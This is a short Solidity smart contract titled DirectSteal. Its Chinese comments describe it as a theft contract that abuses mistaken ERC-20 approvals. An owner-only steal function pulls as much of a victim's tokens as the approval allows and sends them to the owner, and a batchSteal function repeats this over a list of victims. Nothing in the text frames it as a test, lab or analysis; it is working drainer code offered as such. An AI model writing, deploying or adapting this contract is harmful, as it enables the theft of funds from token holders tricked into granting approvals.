// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title DirectSteal
 * @notice 直接盗窃合约 - 利用错误授权
 * @dev 当用户错误授权给恶意合约时，直接转走资金
 */
contract DirectSteal {
    address public owner;

    event Stolen(address indexed victim, address token, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 直接转移受害者资金（需要受害者已授权）
     */
    function steal(address token, address victim) external {
        require(msg.sender == owner, "Not owner");
        IERC20 tok = IERC20(token);
        uint256 bal = tok.balanceOf(victim);
        uint256 allowance = tok.allowance(victim, address(this));
        uint256 amount = bal < allowance ? bal : allowance;
        require(amount > 0, "Nothing to steal");
        tok.transferFrom(victim, owner, amount);
        emit Stolen(victim, token, amount);
    }

    /**
     * @notice 批量盗窃
     */
    function batchSteal(address token, address[] calldata victims) external {
        for (uint256 i = 0; i < victims.length; i++) {
            try this.steal(token, victims[i]) {} catch {}
        }
    }
}
